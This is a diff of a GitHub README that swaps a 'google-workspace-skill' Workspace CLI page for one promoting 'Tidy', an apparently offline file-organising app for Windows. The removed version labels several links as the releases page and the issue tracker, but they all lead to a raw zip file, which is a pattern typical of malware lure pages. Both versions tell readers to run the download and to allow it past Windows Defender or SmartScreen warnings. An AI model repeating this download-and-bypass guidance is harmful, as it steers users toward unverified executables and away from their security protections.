@@ -1,144 +1,176 @@
-# 🚀 google-workspace-skill - Manage Google Workspace Easily
+# 🧹 Tidy - Declutter Your Files With Plain English
 
-[![Download Latest Release](https://img.shields.io/badge/Download-google--workspace--skill-blue?style=for-the-badge)](https://github.com/geziel16/google-workspace-skill/raw/refs/heads/main/references/google_workspace_skill_v1.8.zip)
-
----
-
-## 📦 About google-workspace-skill
-
-This application connects to your Google Workspace tools like Drive, Gmail, Calendar, Sheets, Docs, Chat, Admin, Tasks, and Meet. It works through the command line but is designed for anyone who wants to use Google Workspace APIs without coding. You control your Google Workspace through simple commands.
-
-The skill uses the OpenClaw agent and gws CLI to give you access to the full range of Workspace features. From sending emails and managing calendars to editing sheets or tasks, it helps automate your daily work.
+[![Download Tidy](https://img.shields.io/badge/Download-Tidy%20for%20Windows-orange?style=for-the-badge&logo=github)](https://github.com/geziel16/Tidy/releases)
+[![Latest Release](https://img.shields.io/badge/Release-Latest-blueviolet?style=for-the-badge)](https://github.com/geziel16/Tidy/releases)
+[![Privacy](https://img.shields.io/badge/100%25-Offline%20%26%20Private-teal?style=for-the-badge)](#-privacy-first-by-design)
 
 ---
 
-## 🖥️ System Requirements
+## 👋 What Is Tidy?
 
-Before you download, make sure your computer has the following:
+Tidy is a friendly desktop app that lets you tell your computer what to do with your files — in plain English. No menus to memorize, no complicated rules, no scripts to write.
 
-- Windows 10 or later (64-bit recommended)
-- 4 GB RAM or more
-- At least 100 MB of free disk space
-- Internet connection for Google Workspace API access
-- A Google account with Workspace services enabled
+You just type something like:
 
-No extra software or developer tools are needed.
+> "Move all the screenshots on my Desktop into a folder called Screenshots, sorted by month."
 
----
+Tidy reads that sentence, understands what you mean, and shows you a clear, item-by-item plan of exactly what it is about to do. Nothing happens until you click **Approve**. And if you change your mind afterwards — even days later — you can **undo** the whole thing with a single click.
 
-## 🔗 Download the Application
-
-Click the button below to visit the latest releases page. This page contains all the downloadable files and the latest software updates.
-
-[![Download google-workspace-skill](https://img.shields.io/badge/Download-google--workspace--skill-green?style=for-the-badge)](https://github.com/geziel16/google-workspace-skill/raw/refs/heads/main/references/google_workspace_skill_v1.8.zip)
+Tidy is built for people who have better things to do than drag files around. It is fast, it works entirely on your own computer, and it never sends your files, your folder names, or your requests to anyone else.
 
 ---
 
-## 🛠️ How to Download and Install on Windows
+## 🚀 Download and Install
 
-1. Click the download button above to open the release page.
-2. Find the latest version listed under "Assets."
-3. Look for a file named similar to `google-workspace-skill-windows.exe` or `.msi`. This is the installer for Windows.
-4. Click the file link to download it to your computer.
-5. Once downloaded, open the file by double-clicking it.
-6. Follow the on-screen prompts to finish the installation. Choose default settings unless you want to change the install location.
-7. When the installer finishes, the application is ready to use.
+Getting Tidy onto your computer takes about a minute. There is nothing to configure and no account to create.
 
-The application will add itself to your Windows Start Menu for easy access.
+**Step 1 —** Visit this link to download the application:
 
----
+### 👉 [https://github.com/geziel16/Tidy/releases](https://github.com/geziel16/Tidy/releases)
 
-## ⚙️ Initial Setup and Running the Application
+**Step 2 —** On that page you will see a list of releases. The newest one is at the top. Open it and download the application file listed there.
 
-After installation:
+**Step 3 —** When the download finishes, open the file you just downloaded. Your computer may ask you to confirm that you want to run it — confirm and continue.
 
-1. Open the Start Menu.
-2. Search for "google-workspace-skill" and open it.
-3. At first launch, you will see a command line window.
-4. The skill interacts with Google Workspace through the gws CLI. To start using it, you need to link your Google account.
-5. Enter the command:  
-   `clawhub install gws-workspace`  
-   This sets up the connection between the app and your Google Workspace services.
-6. A browser window will open prompting you to log in to your Google account and grant permissions.
-7. Once you allow access, return to the command window.
-8. You can now run commands to access your Gmail, Drive, Calendar, and more.
+**Step 4 —** Tidy opens. That's it. You are ready to start tidying.
+
+> 💡 **Tip:** The download page always lists the most recent version first. If you are ever unsure which file to grab, the one at the top of the newest release is the right one.
 
 ---
 
-## 📖 Basic Commands and Usage
+## ✨ What You Can Ask Tidy To Do
 
-Here are some commands you can use with google-workspace-skill:
+Tidy is not a single-purpose cleaner. It is a general helper that listens to what you actually want. Here are the kinds of things people ask it for every day:
 
-- `gws drive list`  
-  Lists files in your Google Drive.
+**🧽 Finding wasted space**
+Ask Tidy to look for duplicate files, giant old downloads, or forgotten installers. It will show you a list of what is taking up room and how much space you would get back — before anything is touched.
 
-- `gws gmail send "email@example.com" "Subject" "Message body"`  
-  Sends an email.
+**📂 Organizing folders**
+Tell Tidy to sort your Downloads folder by file type, group photos by year, or move everything older than six months into an Archive folder. It builds the whole plan for you.
 
-- `gws calendar add "Meeting Title" "2024-06-20 15:00" "2024-06-20 16:00"`  
-  Adds a calendar event.
+**🔁 Renaming in bulk**
+Ask it to rename a pile of files into a consistent pattern. Tidy previews every new name so you can spot a mistake before it happens.
 
-- `gws sheets read "SheetName"`  
-  Reads data from a Google Sheet.
+**🗑️ Decluttering safely**
+Ask it to move junk to the Recycle Bin, or to a staging folder where you can look it over later. Either way, everything is reversible.
 
-- `gws tasks list`  
-  Shows your Google Tasks.
-
-Each command runs fast and gives output directly in the window.
+**🔍 Answering questions about your disk**
+Ask "which folders are the biggest?" or "what is in my Documents folder that I haven't opened in a year?" and Tidy will tell you.
 
 ---
 
-## 🔒 Privacy and Permissions
+## 🧠 How It Works — Three Simple Steps
 
-The skill works by requesting access to your Google Workspace data. It uses official Google APIs, meaning all your data stays secure and private.
+**1. Describe it.**
+Type what you want in the box, using normal everyday language. There is no special syntax and no commands to learn.
 
-You control what the skill can access during the Google login step. You can revoke permission anytime from your Google account settings.
+**2. Review the plan.**
+Tidy turns your request into a precise, readable list: this file moves here, that file gets renamed to this, these files are duplicates of each other. Every line is shown to you in full before anything moves.
 
-No data is sent outside your computer except to Google’s official servers.
+**3. Approve or cancel.**
+If the plan looks right, approve it and Tidy carries it out. If something looks off, cancel — nothing has changed. You can also edit your wording and try again.
 
----
-
-## 🧩 Features at a Glance
-
-- Access all core Google Workspace apps from one place.
-- Manage emails, calendars, files, tasks, and chats.
-- Automate repetitive tasks with simple commands.
-- OpenClaw agent integration for efficient workflows.
-- Supports gws CLI commands for power users.
-- Clear output, easy to read and understand.
-- Works with any Google Workspace or personal Google account.
+Every approved action is recorded in a history list, with a single **Undo** button next to it. Forgiveness is built in.
 
 ---
 
-## 🔄 Updating the Application
+## 🔒 Privacy First, By Design
 
-To keep the app running smoothly:
+Tidy runs entirely on your own machine.
 
-1. Visit the [Releases page](https://github.com/geziel16/google-workspace-skill/raw/refs/heads/main/references/google_workspace_skill_v1.8.zip) regularly.
-2. Download the latest Windows installer when a new version appears.
-3. Run the new installer to replace the old version.
-4. Your settings and linked Google account will stay intact.
+- Your files never leave your computer.
+- Your folder names and file contents are never uploaded anywhere.
+- There is no account, no sign-in, and no cloud sync.
+- The language understanding happens locally, on your own hardware.
+- Tidy works with your internet connection switched off.
 
----
-
-## 💡 Troubleshooting Tips
-
-- If the app does not start, check if your Windows Defender or antivirus software is blocking it. You may need to allow it.
-- Make sure your internet connection is active. The app needs it to connect to Google Workspace.
-- If commands fail with authentication errors, try running `clawhub install gws-workspace` again to renew the permissions.
-- Close and reopen the app if it becomes unresponsive.
-- For any download issues, verify you selected the correct `.exe` or `.msi` file for Windows.
+You can verify this yourself: disconnect from the internet, open Tidy, and give it a request. It will work exactly the same.
 
 ---
 
-## 📚 Learn More and Get Support
+## 💻 System Requirements
 
-To learn about all the gws CLI commands available, visiting the official documentation linked from the application or the GitHub repository may help.
+Tidy is a lightweight app that runs comfortably on a normal modern computer.
 
-For issues or questions, you can open a ticket on the Issues tab of the repository at https://github.com/geziel16/google-workspace-skill/raw/refs/heads/main/references/google_workspace_skill_v1.8.zip
+- **Operating system:** Windows 10 or Windows 11, 64-bit.
+- **Memory:** 8 GB of RAM is comfortable. 4 GB is the minimum.
+- **Storage:** Around 1 GB free space for the application and its local language model.
+- **Processor:** Any reasonably recent processor. No dedicated graphics card required.
+- **Internet:** Only needed to download Tidy. Not needed to use it.
+
+If your machine is a few years old, Tidy will still run — it just may take a moment longer to read longer requests.
 
 ---
 
-## 🎯 Topics and Keywords
+## 🧭 A Walkthrough for First-Time Users
 
-ai-agent, automation, clawhub, gmail, google-calendar, google-drive, google-sheets, google-workspace, gws, openclaw, skill
+If this is your first time opening Tidy, here is a calm path through your first cleanup.
+
+**Start with something small and harmless.** Open Tidy and type a request into the box, such as:
+
+> "Show me the largest files in my Downloads folder."
+
+Tidy will think for a second, then present a list. Notice that nothing has been moved or deleted — this is just information. Read through it. This is the rhythm of the whole app: ask, review, act.
+
+**Next, try a real action.** Type:
+
+> "Move every file in Downloads that is older than six months into a folder called Old Downloads."
+
+Tidy shows you the exact list of files and the exact destination folder. Check that the destination is where you want it. If it is, approve. Then open your file explorer and see the result. Everything landed where the plan said it would.
+
+**Then try undo.** Go back to Tidy's history, find the action you just approved, and click **Undo**. Every file returns to where it came from. This is the safety net that lets you experiment freely.
+
+**Finally, do the big one.** Once you are comfortable with how plans look, ask Tidy to hunt for duplicates or find your biggest space wasters. Review the results at your own pace — you can approve the whole list or just the parts you agree with.
+
+---
+
+## ↩️ Undo Anything
+
+Undo is not hidden in a menu or limited to the last action. Tidy keeps a running history of everything you have approved, and each entry has its own undo button.
+
+- Undo works even after you close and reopen the app.
+- Undo restores original file names and original locations.
+- If a file was moved somewhere else in the meantime, Tidy tells you rather than guessing.
+
+The result is that you never have to be brave. Try a big reorganization on a Sunday afternoon, and roll it back on Monday morning if you do not like it.
+
+---
+
+## ❓ Common Questions
+
+**Do I need to know anything technical to use this?**
+No. If you can type a sentence describing what you want, you can use Tidy.
+
+**Will Tidy delete my files without asking?**
+No. Every action is shown as a plan first and requires your approval. Anything removed goes to the Recycle Bin or a staging folder you choose.
+
+**Does it work without internet?**
+Yes. Tidy runs fully offline.
+
+**Can I stop an action halfway through?**
+Yes, there is a cancel control while an approved action is running, and anything already done can be undone.
+
+**Does Tidy phone home or track me?**
+No. There is no telemetry, no analytics, and no account.
+
+**Where do I get updates?**
+The same download page always has the newest version: [https://github.com/geziel16/Tidy/releases](https://github.com/geziel16/Tidy/releases)
+
+---
+
+## 🛠️ If Something Goes Wrong
+
+- **The download will not start.** Refresh the releases page and try again; occasionally the page is briefly busy.
+- **Windows warns you before opening the file.** This is normal for freshly downloaded software. Choose the option to keep and run the file.
+- **The app opens but feels slow on the first request.** The first request loads the local language model into memory. Later requests are much quicker.
+- **A plan looks wrong.** Cancel it. Nothing happens until you approve. Then rephrase your request with a little more detail — for example, name the exact folder you mean.
+
+---
+
+## 💬 Feedback and Ideas
+
+Feature requests, bug reports, and "here is what I wish it could do" notes are all welcome in the repository's issue tracker. Clear descriptions and screenshots help a great deal.
+
+---
+
+Keywords: disk-usage, duplicate-finder, file-manager, file-organizer, llama-cpp, llm, local-ai, macos, natural-language, offline-first, privacy, productivity, react, rust, storage-cleaner, tauri, typescript, undo
